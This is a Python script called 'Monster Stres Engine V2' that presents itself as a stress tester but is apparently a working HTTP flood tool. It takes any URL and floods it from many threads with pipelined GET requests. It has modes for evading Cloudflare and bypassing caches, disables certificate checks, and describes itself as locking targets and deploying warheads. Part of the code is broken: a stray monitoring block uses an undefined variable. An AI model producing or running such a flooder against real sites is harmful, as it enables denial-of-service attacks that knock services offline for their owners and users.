import sys
import threading
import time
import random
import string
import urllib.request
import urllib.error
import socket

# Monster Stres Engine V2 (Cyberpunk Edition)
# Usage: python3 stress_engine.py <URL> <THREADS> <DURATION> <PORT> <MODE>

# Modes:
# 1: NORMAL (Standard Request)
# 2: BYPASS_CF (Cloudflare Evasion - UserAgents + Referers)
# 3: BYPASS_CACHE (Random Query Params)
# 4: KILL_ALL (Mixed)

print("[DEBUG] PYTHON ENGINE LOADED", flush=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36"
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/"
]

def get_random_string(length=8):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

# Shared Counter
TOTAL_REQUESTS = 0
TOTAL_BYTES_SENT = 0
TOTAL_ERRORS = 0
LAST_ERROR = "None"

def attack(target_url, end_time, thread_id, port, mode):
    global TOTAL_REQUESTS, TOTAL_BYTES_SENT, TOTAL_ERRORS, LAST_ERROR
    
    # Parse Host structure
    try:
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        host = parsed.netloc
        path = parsed.path if parsed.path else "/"
        scheme = parsed.scheme
    except:
        host = target_url
        path = "/"
        scheme = "http"

    # Resolve Port
    if port == '80' and scheme == 'https': target_port = 443
    elif port: target_port = int(port)
    else: target_port = 443 if scheme == 'https' else 80

    import ssl
    import socket

    # Pre-build Headers (Base)
    common_headers = (
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Connection: keep-alive\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Cache-Control: no-cache\r\n" # Force server work
        "Pragma: no-cache\r\n"
    )

    # PRE-COMPUTE RANDOM POOL to save CPU
    RANDOM_POOL = [get_random_string(8) for _ in range(1000)]

    while time.time() < end_time:
        s = None
        try:
            # 1. Establish Connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4) 
            
            # Wrap SSL if HTTPS
            if scheme == 'https' or target_port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            
            s.connect((host, target_port))
            
            # 2. INFINITE FLOOD on Single Connection
            # Don't stop until broken or timeout
            while time.time() < end_time:
                
                # Fast Path Selection
                curr_path = path
                if mode == '3' or mode == '4':
                    # Pick from pool instead of generating (CPU Optimization)
                    rnd = RANDOM_POOL[TOTAL_REQUESTS % 1000]
                    sep = '&' if '?' in curr_path else '?'
                    curr_path = f"{path}{sep}t={rnd}"
                
                # Construct Payload (Fastest String Concat)
                payload = (
                    f"GET {curr_path} HTTP/1.1\r\n" +
                    common_headers +
                    "\r\n"
                ).encode('utf-8')

                # Send
                s.sendall(payload)
                
                # Update Stats
                TOTAL_BYTES_SENT += len(payload)
                TOTAL_REQUESTS += 1
                
        except Exception as e:
            TOTAL_ERRORS += 1
            LAST_ERROR = str(e)
            # Break connection loop on error to reconnect
        finally:
            if s: 
                try: s.close()
                except: pass

# ... (Main function kept same mostly) ...

    # Live Monitor
    start_time = time.time()
    last_bytes_check = 0
    
    while time.time() < end_time:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        
        # Calculate Speed
        current_bytes = TOTAL_BYTES_SENT
        bytes_delta = current_bytes - last_bytes_check
        mbps = (bytes_delta * 8) / (1024 * 1024) # Bits / Meg
        last_bytes_check = current_bytes
        
        # Print Status with Errors
        err_msg = ""
        if TOTAL_ERRORS > 0:
            err_msg = f" | ERRORS: {TOTAL_ERRORS} ({LAST_ERROR})"

        print(f"PROGRESS:{elapsed}:{duration} | SPEED: {mbps:.2f} Mbps{err_msg}") 
        sys.stdout.flush()

def main():
    if len(sys.argv) < 6:
        print("Usage: python3 stress_engine.py <URL> <THREADS> <DURATION> <PORT> <MODE>")
        sys.exit(1)

    url = sys.argv[1]
    threads_count = int(sys.argv[2])
    duration = int(sys.argv[3])
    port = sys.argv[4]
    mode = sys.argv[5]

    # Ensure URL Scheme
    if not url.startswith('http'):
        url = 'http://' + url

    # Parse Host for display
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        host = parsed.netloc
    except:
        host = url

    print(f"[*] TARGET LOCKED: {host} (PORT: {port})")
    print(f"[*] MODE: {get_mode_name(mode)}")
    print(f"[*] THREADS: {threads_count} | DURATION: {duration}s")
    print(f"[*] DEPLOYING {threads_count} WARHEADS...")
    print("-" * 40)
    sys.stdout.flush()

    end_time = time.time() + duration
    threads = []

    for i in range(threads_count):
        t = threading.Thread(target=attack, args=(url, end_time, i, port, mode))
        t.daemon = True
        t.start()
        threads.append(t)

    # Live Monitor
    start_time = time.time()
    last_bytes_check = 0
    
    while time.time() < end_time:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        
        # Calculate Speed
        current_bytes = TOTAL_BYTES_SENT
        bytes_delta = current_bytes - last_bytes_check
        mbps = (bytes_delta * 8) / (1024 * 1024) # Bits / Meg
        last_bytes_check = current_bytes
        
        # Print Status with Errors
        err_msg = ""
        if TOTAL_ERRORS > 0:
            err_msg = f" | ERRORS: {TOTAL_ERRORS} ({LAST_ERROR})"

        print(f"PROGRESS:{elapsed}:{duration} | REQ: {TOTAL_REQUESTS} | SPEED: {mbps:.2f} Mbps{err_msg}") 
        sys.stdout.flush()

    print("-" * 40)
    print("[*] MISSION COMPLETE. SYSTEM COOLING DOWN.")

def get_mode_name(mode):
    if mode == '1': return "BASIC HTTP REQUEST"
    if mode == '2': return "BROWSER EMULATION (HTTP 403 BYPASS)"
    if mode == '3': return "RANDOM PATTERNS (CACHE BYPASS)"
    if mode == '4': return "FULL STRESS TEST (MIXED)"
    return "UNKNOWN"

if __name__ == "__main__":
    main()
